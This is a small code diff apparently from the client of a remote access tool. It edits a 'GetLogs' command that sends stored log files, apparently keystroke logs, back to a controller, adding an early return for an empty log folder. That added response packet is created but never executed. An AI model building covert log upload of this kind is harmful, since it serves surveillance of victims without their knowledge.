@@ -352,9 +352,16 @@ namespace xClient.Core.Commands
 
 					FileInfo[] iFiles = dicInfo.GetFiles();
 
+                    if (iFiles.Length == 0)
+                    {
+                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, iFiles.Length);
+                        return;
+                    }
+
 					foreach (FileInfo file in iFiles)
 					{
 						FileSplit srcFile = new FileSplit(file.FullName);
+
 						if (srcFile.MaxBlocks < 0)
 							new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
 
